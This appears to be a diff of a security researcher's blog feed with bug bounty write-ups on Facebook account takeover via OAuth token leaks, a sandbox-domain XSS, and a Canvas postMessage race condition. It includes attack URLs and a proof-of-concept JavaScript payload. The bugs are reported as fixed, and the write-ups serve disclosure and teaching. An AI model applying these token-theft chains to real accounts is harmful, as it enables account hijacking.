+<p>Feb 12, 2025 — <strong>$32,500</strong> bounty awarded by Meta</p>]]></content><author><name></name></author><category term="Uncategorized" /><summary type="html"><![CDATA[Introduction Meta’s web ecosystem relies on cross-window messaging between first-party websites. In many cases, the only security control enforced is an origin check validating that messages originate from facebook.com or its subdomains.]]></summary></entry><entry><title type="html">Two-click Facebook account takeover via FXAuth token and blob theft</title><link href="http://localhost:4000/uncategorized/2026/01/15/steal-fxauth-leads-instagram-ato.html" rel="alternate" type="text/html" title="Two-click Facebook account takeover via FXAuth token and blob theft" /><published>2026-01-15T00:00:00+02:00</published><updated>2026-01-15T00:00:00+02:00</updated><id>http://localhost:4000/uncategorized/2026/01/15/steal-fxauth-leads-instagram-ato</id><content type="html" xml:base="http://localhost:4000/uncategorized/2026/01/15/steal-fxauth-leads-instagram-ato.html"><![CDATA[<h2 id="introduction">Introduction</h2>
 <hr />
 <p><br />
 Facebook and Instagram accounts are deeply integrated through Accounts Center, allowing users to link identities, share authentication methods, and manage security settings across platforms.</p>
@@ -1258,305 +1666,4 @@ onmessage = (e)=>{f=e.data; if (typeof f !== "string") {fun(e.source)}}
 <p><!-- /wp:paragraph --></p>
 <p><!-- wp:paragraph --></p>
 <p>Aug 27, 2022&mdash; Report Sent <br>Sep 25, 2022&mdash;  Acknowledged by Meta<br>Sep 25, 2022&mdash; Fixed by Meta<br>Sep 25, 2022 &mdash; $44250 bounty awarded by Meta. ( Including BountyCon bonuses and bonus for <strong>Highest Impact Report</strong> )</p>
-<p><!-- /wp:paragraph --></p>]]></content><author><name></name></author><category term="Uncategorized" /><summary type="html"><![CDATA[A malicious actor could steal a first-party access token of the Oculus application which he could use to access the Facebook/Oculus accounts. This was possible because the Oculus application in Facebook, which was used to login to Oculus using Facebook accounts has auth.oculus.com/login/ endpoint as a valid redirect_uri. However, Oculus has switched to using Meta Accounts for login. This means that upon visiting auth.oculus.com/login/, the endpoint would redirect to auth.meta.com/oidc/ for login using Meta Accounts and then come back to the auth.oculus.com. We can choose in www.facebook.com OAuth the response_type=token and the token would be passed to the next redirect URL until it reaches again auth.oculus.com. The problem here was that before, auth.oculus.com/login was protecting against token leakage through redirects by having the redirects being made using Javascript , however after the oculus login being changed to Meta accounts and not with Facebook , this protection disappeared and now it directly redirects to the URL initially found in auth.oculus.com/login/?redirect_uri=Redirect_Here. Redirect_Here could be any subdomain of oculus.com and some of them like forums.oculus.com which would redirect to a third party application which can have an open redirect to leak the token ( this was not the open redirect used though ). This bug was simple to find and exploit. Details Setup: 1. Victim is logged-in to Facebook.com2. Victim is not logged-in to Oculus.com ( this is not necessary since we can use a logout CSRF here ) Attack:1) Login CSRF the victim to his Meta account by redirecting to this page https://auth.meta.com/login/facebook/2) Open https://www.facebook.com/v3.1/dialog/oauth?app_id=1517832211847102&amp;redirect_uri=https://auth.oculus.com/login/?redirect_uri=https://forums.oculus.com/openredirect&amp;response_type=token3) After the OAuth flow we can notice that the token ended up in https://forums.oculusvr.com/openredirect#access_token=TOKEN 4) Eventually the access_token would be leaked to https://ysamm.com The open redirect here was not fully disclosed since it's still not fully fixed. Timeline Aug 27, 2022&mdash; Report Sent Sep 25, 2022&mdash;  Acknowledged by MetaSep 25, 2022&mdash; Fixed by MetaSep 25, 2022 &mdash; $44250 bounty awarded by Meta. ( Including BountyCon bonuses and bonus for Highest Impact Report )]]></summary></entry><entry><title type="html">Multiple bugs chained to takeover Facebook Accounts which uses Gmail.</title><link href="http://localhost:4000/uncategorized/2022/05/14/bug-chain-to-achieve-facebook-account-takeover-of-users-signed-up-with-gmail-accounts.html" rel="alternate" type="text/html" title="Multiple bugs chained to takeover Facebook Accounts which uses Gmail." /><published>2022-05-14T17:32:44+03:00</published><updated>2022-05-14T17:32:44+03:00</updated><id>http://localhost:4000/uncategorized/2022/05/14/bug-chain-to-achieve-facebook-account-takeover-of-users-signed-up-with-gmail-accounts</id><content type="html" xml:base="http://localhost:4000/uncategorized/2022/05/14/bug-chain-to-achieve-facebook-account-takeover-of-users-signed-up-with-gmail-accounts.html"><![CDATA[<p><!-- wp:paragraph {"style":{"typography":{"fontSize":"20px"}}} --></p>
-<p style="font-size:20px"><br><br><strong><mark style="background-color:#88e1db" class="has-inline-color">Description</mark></strong></p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph --></p>
-<p>This bug could allow a malicious actor to takeover a Facebook account after stealing a Gmail OAuth id_token/code used to login to Facebook. This happened due to multiple bugs that were chained. Main ones were an intended-by-design XSS in a Facebook sandbox domain and a bug that caused the sharing of sensitive data with this sandbox domain. </p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph {"style":{"typography":{"fontSize":"20px"}}} --></p>
-<p style="font-size:20px"><strong><mark style="background-color:#88e1db" class="has-inline-color">Details</mark></strong></p>
-<p><!-- /wp:paragraph --></p>
-<p>The exploitation of the bugs was developed to only target Facebook users who have signed-up using a Gmail account which has an OAuth Flow that Facebook could use to log them in to Facebook using their account. It was possible to target all Facebook users but that was more complicated to develop an exploit for and this was actually enough to demonstrate the impact. </p>
-<p>Let's first take a look on each weakness i found and later how i chained it all together:</p>
-<p><strong><mark class="has-inline-color" style="background-color: #ffa751;">1. Facebook Checkpoint </mark></strong></p>
-<p><!-- wp:paragraph --></p>
-<p>Facebook has extra security mechanism after login which is responsible of securing the account / verifying the real identity of the user / Ensuring valid MFA. Also, in case your Facebook account was deleted for misuse or temporary blocked you'll end up in this "Checkpoint".</p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph --></p>
-<p>In some cases during this Checkpoint process, you'll need to complete a Captcha to ensure rate limitation and number of tries:</p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:image {"id":765,"sizeSlug":"large","linkDestination":"none"} --></p>
-<figure class="wp-block-image size-large"><img src="https://ysamm.com/assets/uploads/2022/05/captcha-1-1024x416.png" alt="" class="wp-image-765"/><br />
-<figcaption>https://www.facebook.com/checkpoint/CHECKPOINT_ID/</figcaption>
-</figure>
-<p><!-- /wp:image --></p>
-<p><!-- wp:paragraph --></p>
-<p>Here, they've used Google Captcha and as an extra security feature to avoid adding third-party code from Google into main domain, they just included the Google Captcha in a sandbox domain and establish a communication between it and the main domain after putting it in an Iframe.</p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph --></p>
-<p>Everything is fine until now, the strange part in this implementation that they, for unknown reasons ( maybe logging ), decided to share the current URL at the checkpoint with the sandbox domain as follow:</p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:list --></p>
-<ul>
-<li>If for example the current URL is <strong>https://www.facebook.com/checkpoint/CHECKPOINT_ID/?test=test</strong>, <br>the iframe page being loaded would have this URL <strong>https://www.fbsbx.com/captcha/recaptcha/iframe/?referer=</strong>https%3A%2F%2Fwww.facebook.com%2Fcheckpoint%2FCHECKPOINT_ID%2F%3Ftest%3Dtest</li>
-</ul>
-<p><!-- /wp:list --></p>
-<p><!-- wp:paragraph --></p>
-<p>As you can notice the parent window URL was included with parameters. </p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:list --></p>
-<ul>
-<li>Moreover, since we're stuck in this checkpoint any URL visited in www.facebook.com domain would get us redirected to the checkpoint again BUT with the previous URL included in a <strong>next</strong> parameter :<br><br>1 - ( Visited ) <strong>https://www.facebook.com/eg_oauth_callback_endpoint?code=code </strong><br><br>2 - ( After Server-Side Redirect ) <strong>https://www.facebook.com/checkpoint/CHECKPOINT_ID/?next=</strong>https%3A%2F%2Fwww.facebook.com%2Feg_oauth_callback_endpoint%3Fcode%3Dcode<br><br>3 - ( Inside Iframe ) <strong>https://www.fbsbx.com/captcha/recaptcha/iframe/?referer=</strong>https://www.facebook.com/checkpoint/CHECKPOINT_ID/?next=https%3A%2F%2Fwww.facebook.com%2Feg_oauth_callback_endpoint%3Fcode%3Dcode</li>
-</ul>
-<p><!-- /wp:list --></p>
-<p><!-- wp:paragraph --></p>
-<p>At this point, we can leak any visited endpoint and its parameters in www.facebook.com to www.fbsbx.com. Next step is to find a way to leak it from the sandbox domain to us. This shouldn't be hard since sandbox domains security is loosen compared to main ones and an XSS was easily found there.</p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph --></p>
-<p><strong><mark style="background-color:#ffa751" class="has-inline-color">2. XSS in www.fbsbx.com </mark></strong></p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph --></p>
-<p>I already had one in pocket for this. I wouldn't call it a bug since Facebook actually used the sandbox domain to allow some users to test a certain feature that have HTML files uploading possible. Even after this report, it was kept as it is since like i said in the beginning it's intended-by-design. </p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph --></p>
-<p>It's simply going to <strong>https://developers.facebook.com/tools/playable-preview/ </strong>while having a developer account and upload any HTML file with your script and eventually you'll have it uploaded to www.fbsbx.com like this : <strong>https://www.fbsbx.com/developer/tools/playable-preview/preview-asset/?handle_str=STR</strong></p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph --></p>
-<p>A good thing to learn here and Facebook actually was doing it to some extent is to have a separate sandbox subdomain for each feature. This ensure that third-party code hosted and configured by Facebook but not fully trusted, is not hosted in the same domain as user uploaded code which is mainly to ensure SOP ( of course document.domain shouldn't be set to the top level domain in the sandbox domains hosting Facebook code )</p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph --></p>
-<p><strong><mark style="background-color:#ffa751" class="has-inline-color">3. Logout CSRF &amp; Login CSRF</mark></strong></p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph --></p>
-<p>Normally the Facebook account to be targeted in not in the checkpoint state, because of that we can't leverage the bug above. <br><br>In this case, we should log out the current user and log him in to the attacker account which is in the Checkpoint state. BUT if we do that how we're going to Takeover his Facebook account? <br><br>The answer here to actually target a third-party OAuth provider that Facebook uses which is Gmail.<br>Gmail sends back the OAuth code/token to www.facebook.com if the user is logged in to Gmail, and since we can steal anything that is coming to www.facebook.com we can use the Google OAuth code to login to the Facebook account that has that Gmail account linked to it ( meaning any account that has a gmail account )</p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph --></p>
-<p><strong><mark style="background-color:#ffa751" class="has-inline-color">3. SOP &amp; COOP</mark></strong></p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph --></p>
-<p>To steal the URL passed to the iframe inside www.facebook.com, we first should establish a relation between the two windows:<br>The window (1) that is having the page with URL <strong>https://www.facebook.com/checkpoint/?next=Pevious_Page_With_Gmail_Code</strong> and the window (2) that have the page in <strong>https://www.fbsbx.com/developer/tools/playable-preview/preview-asset/?handle_str=</strong> with XSS and attack script.<br><br>This way, from window (2) we can for example access <strong>opener.frames[0]</strong>.location.href : <br>- <strong>Opener</strong> here is window (1). <br>- <strong>frames[0]</strong> is the iframe inside which has <strong>https://www.fbsbx.com/captcha/recaptcha/iframe/?referer=</strong>https://www.facebook.com/checkpoint/?next=Pevious_Page_With_Gmail_Code<br><br>Since frames[0] and window (2) are same-origin we have access to read the page <strong>location.href</strong> which contains the stolen code.<br><br>The only protection that could have prevented this was COOP ( Cross-Origin-Opener-Policy ) which was being heavily applied in Facebook in previous months but likely was not in the callback&amp;checkpoint endpoints.</p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph {"style":{"typography":{"fontSize":"20px"}}} --></p>
-<p style="font-size:20px"><strong><mark style="background-color:#88e1db" class="has-inline-color">Attack Steps</mark></strong></p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph --></p>
-<p>The full attack below would be delivered via an uploaded script to www.fbsbx.com by exploiting the XSS explained in step 2) and by having a code that does the following steps :</p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph --></p>
-<p>1) Logout CSRF: <strong>REDACTED</strong><br><br>2) Login CSRF: <strong><strong>REDACTED</strong></strong> </p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph --></p>
-<p>3) Open <strong>https://accounts.google.com/o/oauth2/auth?redirect_uri=https://www.facebook.com/oauth2/redirect/&amp;response_type=permission%20code%20id_token&amp;scope=email%20profile%20openid&amp;client_id=15057814354-80cg059cn49j6kmhhkjam4b00on1gb2n.apps.googleusercontent.com</strong> using window.open (Opened window noted <strong>TARGET</strong>) . It would redirect to www.facebook.com/checkpoint/CHECKPOINT_ID/?next=URL_WITH_CODE where URL_WITH_CODE is www.facebook.com/oauth2/redirect/?code=Gmail_Code</p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph --></p>
-<p>4) Wait for few seconds and access TARGET.frames[0].location.href. We should have the Google OAuth code and id_token.</p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph --></p>
-<p>In the attacker side, we can extract the email address from id_token, then we can start a password recovery process in www.facebook.com ( to set the right sfui cookie ) and later choose to connect to Gmail ( openid ) and we would be redirected to a similar URL like Step 3 but with an extra state parameter.</p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph --></p>
-<p>We use the state from the previous step ( state in the redirect to accounts.google.com ) and we put it here to construct this final URL <br><strong>https://www.facebook.com/oauth2/redirect/?state=STATE&amp;code=CODE_FROM_STEP_4. <br></strong><br>If we visit this URL, we should find in the response body a link to access the victim account ( contains a nonce in the /recover/password/ URL )</p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph {"style":{"typography":{"fontSize":"20px"}}} --></p>
-<p style="font-size:20px"><strong><mark style="background-color:#88e1db" class="has-inline-color">Timeline</mark></strong></p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph --></p>
-<p>Feb 16, 2022&mdash; Report Sent <br>Feb 22, 2022&mdash;  Acknowledged by Facebook<br>Mar 21, 2022&mdash; Fixed by Facebook<br>May 14, 2022 &mdash; $44625 bounty awarded by Facebook. (7000 Diamond League Bonus, 2625 Bounty Delay Bonus)<br> </p>
-<p><!-- /wp:paragraph --></p>]]></content><author><name></name></author><category term="Uncategorized" /><summary type="html"><![CDATA[Description This bug could allow a malicious actor to takeover a Facebook account after stealing a Gmail OAuth id_token/code used to login to Facebook. This happened due to multiple bugs that were chained. Main ones were an intended-by-design XSS in a Facebook sandbox domain and a bug that caused the sharing of sensitive data with this sandbox domain. Details The exploitation of the bugs was developed to only target Facebook users who have signed-up using a Gmail account which has an OAuth Flow that Facebook could use to log them in to Facebook using their account. It was possible to target all Facebook users but that was more complicated to develop an exploit for and this was actually enough to demonstrate the impact. Let's first take a look on each weakness i found and later how i chained it all together: 1. Facebook Checkpoint Facebook has extra security mechanism after login which is responsible of securing the account / verifying the real identity of the user / Ensuring valid MFA. Also, in case your Facebook account was deleted for misuse or temporary blocked you'll end up in this "Checkpoint". In some cases during this Checkpoint process, you'll need to complete a Captcha to ensure rate limitation and number of tries: https://www.facebook.com/checkpoint/CHECKPOINT_ID/ Here, they've used Google Captcha and as an extra security feature to avoid adding third-party code from Google into main domain, they just included the Google Captcha in a sandbox domain and establish a communication between it and the main domain after putting it in an Iframe. Everything is fine until now, the strange part in this implementation that they, for unknown reasons ( maybe logging ), decided to share the current URL at the checkpoint with the sandbox domain as follow: If for example the current URL is https://www.facebook.com/checkpoint/CHECKPOINT_ID/?test=test, the iframe page being loaded would have this URL https://www.fbsbx.com/captcha/recaptcha/iframe/?referer=https%3A%2F%2Fwww.facebook.com%2Fcheckpoint%2FCHECKPOINT_ID%2F%3Ftest%3Dtest As you can notice the parent window URL was included with parameters. Moreover, since we're stuck in this checkpoint any URL visited in www.facebook.com domain would get us redirected to the checkpoint again BUT with the previous URL included in a next parameter :1 - ( Visited ) https://www.facebook.com/eg_oauth_callback_endpoint?code=code 2 - ( After Server-Side Redirect ) https://www.facebook.com/checkpoint/CHECKPOINT_ID/?next=https%3A%2F%2Fwww.facebook.com%2Feg_oauth_callback_endpoint%3Fcode%3Dcode3 - ( Inside Iframe ) https://www.fbsbx.com/captcha/recaptcha/iframe/?referer=https://www.facebook.com/checkpoint/CHECKPOINT_ID/?next=https%3A%2F%2Fwww.facebook.com%2Feg_oauth_callback_endpoint%3Fcode%3Dcode At this point, we can leak any visited endpoint and its parameters in www.facebook.com to www.fbsbx.com. Next step is to find a way to leak it from the sandbox domain to us. This shouldn't be hard since sandbox domains security is loosen compared to main ones and an XSS was easily found there. 2. XSS in www.fbsbx.com I already had one in pocket for this. I wouldn't call it a bug since Facebook actually used the sandbox domain to allow some users to test a certain feature that have HTML files uploading possible. Even after this report, it was kept as it is since like i said in the beginning it's intended-by-design. It's simply going to https://developers.facebook.com/tools/playable-preview/ while having a developer account and upload any HTML file with your script and eventually you'll have it uploaded to www.fbsbx.com like this : https://www.fbsbx.com/developer/tools/playable-preview/preview-asset/?handle_str=STR A good thing to learn here and Facebook actually was doing it to some extent is to have a separate sandbox subdomain for each feature. This ensure that third-party code hosted and configured by Facebook but not fully trusted, is not hosted in the same domain as user uploaded code which is mainly to ensure SOP ( of course document.domain shouldn't be set to the top level domain in the sandbox domains hosting Facebook code ) 3. Logout CSRF &amp; Login CSRF Normally the Facebook account to be targeted in not in the checkpoint state, because of that we can't leverage the bug above. In this case, we should log out the current user and log him in to the attacker account which is in the Checkpoint state. BUT if we do that how we're going to Takeover his Facebook account? The answer here to actually target a third-party OAuth provider that Facebook uses which is Gmail.Gmail sends back the OAuth code/token to www.facebook.com if the user is logged in to Gmail, and since we can steal anything that is coming to www.facebook.com we can use the Google OAuth code to login to the Facebook account that has that Gmail account linked to it ( meaning any account that has a gmail account ) 3. SOP &amp; COOP To steal the URL passed to the iframe inside www.facebook.com, we first should establish a relation between the two windows:The window (1) that is having the page with URL https://www.facebook.com/checkpoint/?next=Pevious_Page_With_Gmail_Code and the window (2) that have the page in https://www.fbsbx.com/developer/tools/playable-preview/preview-asset/?handle_str= with XSS and attack script.This way, from window (2) we can for example access opener.frames[0].location.href : - Opener here is window (1). - frames[0] is the iframe inside which has https://www.fbsbx.com/captcha/recaptcha/iframe/?referer=https://www.facebook.com/checkpoint/?next=Pevious_Page_With_Gmail_CodeSince frames[0] and window (2) are same-origin we have access to read the page location.href which contains the stolen code.The only protection that could have prevented this was COOP ( Cross-Origin-Opener-Policy ) which was being heavily applied in Facebook in previous months but likely was not in the callback&amp;checkpoint endpoints. Attack Steps The full attack below would be delivered via an uploaded script to www.fbsbx.com by exploiting the XSS explained in step 2) and by having a code that does the following steps : 1) Logout CSRF: REDACTED2) Login CSRF: REDACTED 3) Open https://accounts.google.com/o/oauth2/auth?redirect_uri=https://www.facebook.com/oauth2/redirect/&amp;response_type=permission%20code%20id_token&amp;scope=email%20profile%20openid&amp;client_id=15057814354-80cg059cn49j6kmhhkjam4b00on1gb2n.apps.googleusercontent.com using window.open (Opened window noted TARGET) . It would redirect to www.facebook.com/checkpoint/CHECKPOINT_ID/?next=URL_WITH_CODE where URL_WITH_CODE is www.facebook.com/oauth2/redirect/?code=Gmail_Code 4) Wait for few seconds and access TARGET.frames[0].location.href. We should have the Google OAuth code and id_token. In the attacker side, we can extract the email address from id_token, then we can start a password recovery process in www.facebook.com ( to set the right sfui cookie ) and later choose to connect to Gmail ( openid ) and we would be redirected to a similar URL like Step 3 but with an extra state parameter. We use the state from the previous step ( state in the redirect to accounts.google.com ) and we put it here to construct this final URL https://www.facebook.com/oauth2/redirect/?state=STATE&amp;code=CODE_FROM_STEP_4. If we visit this URL, we should find in the response body a link to access the victim account ( contains a nonce in the /recover/password/ URL ) Timeline Feb 16, 2022&mdash; Report Sent Feb 22, 2022&mdash;  Acknowledged by FacebookMar 21, 2022&mdash; Fixed by FacebookMay 14, 2022 &mdash; $44625 bounty awarded by Facebook. (7000 Diamond League Bonus, 2625 Bounty Delay Bonus)]]></summary></entry><entry><title type="html">More secure Facebook Canvas Part 2: More Account Takeovers</title><link href="http://localhost:4000/uncategorized/2022/03/04/more-secure-facebook-canvas-part-2.html" rel="alternate" type="text/html" title="More secure Facebook Canvas Part 2: More Account Takeovers" /><published>2022-03-04T16:43:51+02:00</published><updated>2022-03-04T16:43:51+02:00</updated><id>http://localhost:4000/uncategorized/2022/03/04/more-secure-facebook-canvas-part-2</id><content type="html" xml:base="http://localhost:4000/uncategorized/2022/03/04/more-secure-facebook-canvas-part-2.html"><![CDATA[<p><!-- wp:paragraph --></p>
-<p><strong>Summary</strong></p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph --></p>
-<p>After publishing the write-ups about the bugs i previously found in Facebook Games Platform ( Canvas ), i thought about taking a more in depth look into the code and changes made to it after fixes as sometimes a fix of a bug can introduce another one. In this blog post, i'll write about 3 more bugs found which lead to Facebook Account Takeover.</p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:embed {"url":"https://ysamm.com/?p=708","type":"wp-embed","providerNameSlug":"youssef-sammouda"} --></p>
-<figure class="wp-block-embed is-type-wp-embed is-provider-youssef-sammouda wp-block-embed-youssef-sammouda">
-<div class="wp-block-embed__wrapper">
-https://ysamm.com/?p=708
-</div>
-</figure>
-<p><!-- /wp:embed --></p>
-<p><!-- wp:paragraph {"style":{"typography":{"fontSize":"20px"}}} --></p>
-<p style="font-size:20px"><strong>Bug 1: Race Condition Bug </strong></p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph --></p>
-<p>Llast time i explained in depth how some parts of the code works and actually recommended you to take a look at the rest ( fortunately you didn't ), last time i focused on the parts that construct the request to be sent to Facebook OAuth endpoint, this time i focused on how the result from that request which would contain the access_token would be delivered to the game website in the iframe. Main focus of analysis here is on the <strong>PlatformAppController</strong> module, <strong>showDialog</strong> function and more: </p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:code --></p>
-<pre class="wp-block-code"><code lang="javascript" class="language-javascript">window.addEventListener("message", function(a) {
-        if (a.data.xdArbiterSyn) d("SecurePostMessage").sendMessageAllowAnyOrigin_UNSAFE(a.source, {
-            xdArbiterAck: !0
-        });
-        else if (a.data.xdArbiterRegister) {
-            var b = l.register(a.source, a.data.xdProxyName, a.data.origin, a.origin);
-...
-__d("XdArbiter", ... {
-...
-register: function(a, b, d, e) {
-                e = b != null &amp;&amp; b !== "" ? b : h;
-                c("Arbiter").inform("XdArbiter/register", {
-                    origin: d
-
-</code></pre>
-<p><!-- /wp:code --></p>
-<p><!-- wp:code {"lineNumbers":true} --></p>
-<pre class="wp-block-code"><code lang="javascript" class="language-javascript line-numbers">__d("PlatformAppController",...  (function(a, b, c, d, e, f, g, h) {
-...
-        u = new(c("JSONRPC"))(function(a, b) {
-            var d = b.origin || k;
-            b = b.source;
-            if (b == null) {
-                var e = c("ge")(j);
-                b = e.contentWindow
-            }
-            c("XdArbiter").send("FB_RPC:" + a, b, d)
-        });
-    c("Arbiter").subscribe("XdArbiter/register", function(a, b) {
-        q &amp;&amp; b.origin != k &amp;&amp; new(c("AsyncRequest"))().setURI("/platform/app_owned_url_check/").setData({
-            appid: q,
-            url: b.origin
-        }).setHandler(function(a) {
-            a = a.getPayload();
-            a.allowed &amp;&amp; (k = b.origin)
-        }).send()
-    });
-
-    function f(a, b, e) {
-        var f, g = a.method;
-        delete a.method;
-        delete a.access_token;
-        delete a.next;
-        delete a.context;
-        delete a.locale;
-        a.display = "async";
-        if (g == null || typeof g !== "string" || !/^[\w\-_.]+$/.test(g)) throw new Error("Malformed method name");
-        Object.keys(a).forEach(function(b) {
-            if (/[\s\x80-\x9f]/.test(b)) delete a[b];
-            else if (/\./.test(b)) {
-                var c = b.replace(/\./g, "_");
-                Object.prototype.hasOwnProperty.call(a, c) &amp;&amp; delete a[b]
-            }
-        });
-        var h = (f = this.origin) != null ? f : k;
-        typeof a.redirect_uri === "string" &amp;&amp; new(c("URI"))(a.redirect_uri).getOrigin() === new(c("URI"))(this.origin).getOrigin() &amp;&amp; (h = a.redirect_uri);
-        a.redirect_uri = h;
-        g == "apprequests" &amp;&amp; (g = "app_requests", a.context = "canvas_app_requests");
-        if (g == "pay") {
-            f = a.action;
-            (f === "purchaseitem" || f === "purchase_item") &amp;&amp; r &amp;&amp; r.usePaymentModules &amp;&amp; (g = "payment_module", a.action = "payment_module");
-            f === "purchaseiap" &amp;&amp; r &amp;&amp; r.iapUsePaymentModule &amp;&amp; (g = "payment_module_iap", a.action = "payment_module_iap");
-            f === "purchaseitem" || f === "purchase_item" || f === "purchaseiap" ? i[g] = !0 : r &amp;&amp; r.useNewPayDialog &amp;&amp; (f === "create_subscription" || f === "createsubscription" || f === "changesubscription" || f === "modifysubscription" || f === "cancelsubscription" || f === "reactivatesubscription" || f === "settlesubscription") ? (g = "payment_subscription", f === "create_subscription" &amp;&amp; (a.action = "createsubscription")) : i[g] = !1
-        }
-        g == "fbpromotion" &amp;&amp; (g = "payer_promotion", a.action = "payer_promotion");
-        g === "stream_publish" &amp;&amp; (g = "stream.publish");
-        (g == "permissions.oauth" || g == "permissions.request" || g == "oauth") &amp;&amp; (g = "oauth");
-        g === "stream.publish" &amp;&amp; (i[g] = !0);
-        a = v(a, g);
-        if (i[g]) {
-            w(g, a, function(d) {
-                d.error_code == 1340004 ? c("CurrentUser").getID() &amp;&amp; c("CurrentUser").getID() != "0" ? b(d) : new(c("URI"))("/login.php").addQueryData("next", c("URI").getRequestURI().toString()).go() : g === "app_requests" &amp;&amp; d.error_code == 1349146 ? x(g, a, b, d, h) : b(d)
-            });
-            return
-        }
-        f = new(c("URI"))("/fbml/ajax/dialog/" + g.replace(/\./g, "_")).setQueryData(a);
-        f = new(c("AsyncRequest"))().setMethod("GET").setReadOnly(!0).setURI(f).setAbortHandler(function() {
-            e(d("PlatformDialogClient").REQUEST_ABORTED_ERROR)
-        });
-        new(c("Dialog"))().setAsync(f).setModal(!0).setWideDialog(!0).show().setCloseHandler(b)
-    }
-   ...
-    function x(a, b, c, d, e) {
-        b.redirect_uri = e, w("oauth", b, function(f) {
-            f.error ? c(d) : (b.redirect_uri = e, w(a, b, function(a) {
-                c(a)
-            }))
-        })
-    }
-    u.local.setSize = b;
-    u.local.getPageInfo = e;
-    u.local.scrollTo = a;
-    u.local.showDialog = f;
-  ...
-}), 98);</code></pre>
-<p><!-- /wp:code --></p>
-<p><!-- wp:paragraph --></p>
-<p>the function <strong>f</strong> (u.local.showDialog) receives the message from the iframe and would construct the request to be sent to the OAuth endpoint ( redirect_uri and additional parameters ), also it would make sure as we pointed out in the previous post that the "Origin" URL to be included in redirect_uri parameter in the request to the OAuth endpoint would be the same one used later as <strong>targetOrigin</strong> in the postMessage method to send a message to the iframe, meaning even if we can specify Origin as https://www.instagram.com and the app_id of the Instagram application and we get a valid access_token from the server response, the access_token won't be delivered to the us since our iframe doesn't have www.instagram.com origin. Well, a bypass to this security mechanism was found :<br><br>In line 38, we can notice that there's a check whatever Origin supplied ( this.origin ) is null, this check was added as a fix to a previous bug ( 2 ), this time if the Origin is null or undefined the application should use the value of variable "<strong>k</strong>". The variable "<strong>k</strong>" is set automatically to the origin of the URL set in the game application settings ( iframe URL ), however its value can be changed later. <br><br>In line 12, we can notice that there's a listener for an "<strong>XdArbiter/register</strong>" Arbiter message , upon receiving a valid message, it would send a server request to the endpoint <strong>/platform/app_owned_url_check/</strong> with the parameters app_id ( the current app id / attacker app id ) and URL which the one we're trying to set "<strong>k</strong>" to. </p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph --></p>
-<p>All Facebook applications have <strong>fbconnect://success</strong> as a valid redirect_uri, we can set "<strong>k</strong>" to that value by sending a register message, and the trick here is that we can send another register message while the application is still waiting for the response to the OAuth endpoint, and change "<strong>k</strong>" back to the attacker website. Now, notice in line 4, k would be chosen but "k" with the new value and not "fbconnect://success" which would allow us to get the first party access_token.</p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph --></p>
-<p><strong>Proof of Concept</strong></p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:code --></p>
-<pre class="wp-block-code"><code lang="javascript" class="language-javascript">window.parent.postMessage({xdArbiterRegister:true,origin:"fbconnect://success"},"*");} 
-msg = JSON.stringify({"jsonrpc":"2.0",
-                                    "method":"showDialog",
-                                    "id":1,
-                                    "params":[{"method":"permissions.oauth","app_id":"APP_ID","client_id":"APP_ID","response_type":"token"}]})
-                fullmsg = {xdArbiterHandleMessage:true,message:"FB_RPC:" + msg }
-window.parent.postMessage(fullmsg,"*")
-setTimeout(function(){
-    window.parent.postMessage({xdArbiterRegister:true,origin:"https://ysamm.com"},"*");} 
-},1000);
-</code></pre>
-<p><!-- /wp:code --></p>
-<p><!-- wp:paragraph --></p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph --></p>
-<p><strong>Fix</strong></p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph --></p>
-<p>Meta security team fixed this bug by introducing a lock mechanism ( variable "s" ) which would initially bet set to <strong>false</strong> but in case "<strong>k</strong>" was chosen in <strong>showDialog</strong> due to an empty Origin , "s" would be set to <strong>true</strong>. The state of this variable "s" would of course be added as a condition to change or not change "<strong>k</strong>" in <strong>XdArbiter/register</strong>. Also, finally they have decided to ensure that app_id sent to the OAuth endpoint could only be the current app_id and not one specified in the cross-window message. </p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph {"style":{"typography":{"fontSize":"20px"}}} --></p>
-<p style="font-size:20px"><strong>Bug 2: Bypasses to previous fix</strong></p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph --></p>
-<p>I won't talk much about this bug, i only introduced bypasses to the app_id restriction and also a bypass to the previous fix of the lock mechanism. This bypass introduced a rare case which needs time accuracy and other conditions to be met in order to work. The security team mitigated these bypasses and done more hardening which unfortunately didn't stop me from finding a third bug.</p>
-<p><!-- /wp:paragraph --></p>
